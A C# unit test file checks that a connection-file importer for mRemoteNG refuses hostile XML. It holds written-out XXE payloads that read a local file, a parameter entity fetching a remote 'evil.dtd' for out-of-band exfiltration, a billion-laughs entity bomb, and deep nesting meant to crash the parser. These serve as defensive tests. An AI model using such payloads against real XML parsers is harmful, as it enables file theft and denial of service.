using System.Globalization;
using System.Text;
using Patchbay.Core.Import;
using Patchbay.Core.Model;

namespace Patchbay.Tests;

/// <summary>
/// The tests that decide whether the mRemoteNG importer is allowed to ship
/// (M1-20, M3-12).
///
/// It shares `SafeXml` with the RDCMan reader, so the same attacks are run
/// again through this one rather than assumed to be covered. Sharing a parser
/// is a reason to expect them to pass, not a reason not to ask: the settings
/// live on one object and a future change to it would break both readers while
/// only one of them had tests.
///
/// This format puts everything in attributes rather than element text, which
/// makes the attribute cases the ones that matter here — an entity expanded
/// into `Hostname` is an address the person then connects to.
///
/// Each test names the attack it stands for. If one starts failing, the
/// importer is not to be released with it failing.
/// </summary>
public sealed class MremoteNgImporterSecurityTests : IDisposable
{
    private const string Secret = "PATCHBAY-CANARY-4b90ef";

    private readonly string _secretFile;

    public MremoteNgImporterSecurityTests()
    {
        _secretFile = Path.Combine(Path.GetTempPath(), $"patchbay-canary-{Guid.NewGuid():N}.txt");
        File.WriteAllText(_secretFile, Secret);
    }

    public void Dispose()
    {
        try
        {
            File.Delete(_secretFile);
        }
        catch (IOException)
        {
        }
    }

    private string FileUri => new Uri(_secretFile).AbsoluteUri;

    /// <summary>
    /// The attack that had RDCMan withdrawn, aimed at this format instead. An
    /// entity expanded into a host name is worse than one expanded into a
    /// label: it is an address somebody then connects to.
    /// </summary>
    [Fact]
    public void An_external_entity_in_an_attribute_is_refused()
    {
        string hostile = $"""
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE mrng:Connections [ <!ENTITY exfil SYSTEM "{FileUri}"> ]>
            <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="X" ConfVersion="2.6">
              <Node Name="&exfil;" Type="Connection" Hostname="&exfil;" Protocol="RDP"
                    InheritProtocol="false" />
            </mrng:Connections>
            """;

        ImportException ex = Assert.Throws<ImportException>(() => MremoteNgImporter.Import(hostile));

        Assert.DoesNotContain(Secret, ex.ToString(), StringComparison.Ordinal);
    }

    [Fact]
    public void An_external_entity_in_element_text_is_refused()
    {
        string hostile = $"""
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE mrng:Connections [ <!ENTITY exfil SYSTEM "{FileUri}"> ]>
            <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="X" ConfVersion="2.6">&exfil;</mrng:Connections>
            """;

        ImportException ex = Assert.Throws<ImportException>(() => MremoteNgImporter.Import(hostile));

        Assert.DoesNotContain(Secret, ex.ToString(), StringComparison.Ordinal);
    }

    /// <summary>
    /// Out-of-band exfiltration: a parameter entity fetching a remote DTD,
    /// which then posts the local file back. Blocked at the same place, and
    /// worth its own test because it does not look like the textbook example.
    /// </summary>
    [Fact]
    public void A_parameter_entity_fetching_a_remote_dtd_is_refused()
    {
        const string Hostile = """
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE mrng:Connections [
              <!ENTITY % remote SYSTEM "http://127.0.0.1:9/evil.dtd">
              %remote;
            ]>
            <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="X" ConfVersion="2.6" />
            """;

        Assert.Throws<ImportException>(() => MremoteNgImporter.Import(Hostile));
    }

    [Fact]
    public void An_external_document_type_is_refused()
    {
        string hostile = $"""
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE mrng:Connections SYSTEM "{FileUri}">
            <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="X" ConfVersion="2.6" />
            """;

        ImportException ex = Assert.Throws<ImportException>(() => MremoteNgImporter.Import(hostile));

        Assert.DoesNotContain(Secret, ex.ToString(), StringComparison.Ordinal);
    }

    /// <summary>
    /// Billion laughs. Nine nested entities expand to a gigabyte of text and
    /// take the process with them. Refusing the document type declaration
    /// stops it before a single entity is expanded.
    /// </summary>
    [Fact]
    public void An_entity_expansion_bomb_is_refused()
    {
        const string Hostile = """
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE mrng:Connections [
              <!ENTITY a "aaaaaaaaaa">
              <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
              <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
              <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
              <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
            ]>
            <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="&e;" ConfVersion="2.6" />
            """;

        Assert.Throws<ImportException>(() => MremoteNgImporter.Import(Hostile));
    }

    /// <summary>
    /// A harmless-looking document type declaration is refused too. There is
    /// no reason for a confCons.xml to carry one, and allowing the safe shape
    /// means the parser has to decide what is safe on every file.
    /// </summary>
    [Fact]
    public void Any_document_type_declaration_at_all_is_refused()
    {
        const string Hostile = """
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE mrng:Connections>
            <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="X" ConfVersion="2.6" />
            """;

        Assert.Throws<ImportException>(() => MremoteNgImporter.Import(Hostile));
    }

    /// <summary>
    /// Nesting is legal XML and costs an attacker nothing. A recursive parser
    /// meeting a few thousand levels of it overflows the stack, which kills
    /// the process outright rather than raising something catchable — and this
    /// format nests by container, so the walk is recursive.
    /// </summary>
    [Fact]
    public void A_document_nested_beyond_the_limit_is_refused()
    {
        Assert.Throws<ImportException>(() => MremoteNgImporter.Import(Nested(SafeXml.MaxDepth + 20)));
    }

    /// <summary>
    /// Nesting up to the limit is ordinary XML and has to keep working, or the
    /// guard is just a smaller version of the same denial of service.
    /// </summary>
    [Fact]
    public void Nesting_within_the_limit_still_imports()
    {
        ImportResult result = MremoteNgImporter.Import(Nested(SafeXml.MaxDepth - 2));

        Assert.Equal(1, result.ServerCount);
    }

    /// <summary>
    /// mRemoteNG encrypts passwords under a key derived from a password that
    /// defaults to a published value, so unlike RDCMan's DPAPI blobs these
    /// could be read. Not reading them is therefore a decision, and this is
    /// the test that holds it: nothing out of a `Password` attribute reaches
    /// the tree, a warning, or anything else a person or a log file sees.
    /// </summary>
    [Fact]
    public void A_saved_password_is_never_read_out_of_the_file()
    {
        ImportResult result = MremoteNgImporter.Import($"""
            <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="X" ConfVersion="2.6"
                              Protected="{Secret}">
              <Node Name="WEB-01" Type="Connection" Hostname="web-01" Protocol="RDP"
                    Username="rdpadmin" Password="{Secret}" RDGatewayPassword="{Secret}"
                    InheritProtocol="false" InheritUsername="false" />
            </mrng:Connections>
            """);

        ServerNode server = Assert.IsType<ServerNode>(Assert.Single(result.Root.Children));

        string everything = string.Join(
            '\n',
            result.Warnings
                .Append(server.Name)
                .Append(server.HostName)
                .Append(server.Notes)
                .Append(server.Settings.UserName)
                .Append(server.Settings.Domain)
                .Append(server.Settings.GatewayUserName));

        Assert.DoesNotContain(Secret, everything, StringComparison.OrdinalIgnoreCase);
        Assert.Equal(CredentialMode.Prompt, server.Settings.CredentialMode);
    }

    /// <summary>
    /// The size bound that stops a hostile file exhausting memory before it is
    /// refused. Asserted through this reader as well, because it is a setting
    /// on the shared parser and a change to it would go unnoticed here.
    /// </summary>
    [Fact]
    public void The_document_size_bound_is_in_force()
    {
        Assert.Equal(64L * 1024 * 1024, SafeXml.MaxCharacters);
    }

    private static string Nested(int depth)
    {
        StringBuilder xml = new();

        xml.Append(
            """<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="X" ConfVersion="2.6">""");

        for (int i = 0; i < depth; i++)
        {
            xml.Append(string.Create(
                CultureInfo.InvariantCulture,
                $"""<Node Name="Folder {i}" Type="Container">"""));
        }

        xml.Append(
            """<Node Name="WEB-01" Type="Connection" Hostname="web-01" Protocol="RDP" """)
           .Append("""InheritProtocol="false" />""");

        for (int i = 0; i < depth; i++)
        {
            xml.Append("</Node>");
        }

        return xml.Append("</mrng:Connections>").ToString();
    }
}
